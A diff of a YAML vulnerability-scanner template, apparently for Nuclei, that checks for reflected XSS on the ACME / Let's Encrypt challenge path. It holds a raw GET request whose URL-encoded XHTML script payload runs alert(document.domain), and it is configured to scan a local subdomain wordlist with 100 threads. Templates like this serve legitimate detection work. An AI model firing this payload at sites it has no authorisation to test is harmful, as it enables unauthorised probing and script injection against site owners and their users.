@@ -1,17 +1,14 @@
 id: acme-xss
-
 info:
   name: ACME / Let's Encrypt Reflected XSS
   author: pdteam
   severity: low
   tags: xss,acme
-
 requests:
   - payloads:
       Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
     attack: sniper
     threads: 100
-
     raw:
       - |
         GET /.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E HTTP/1.1
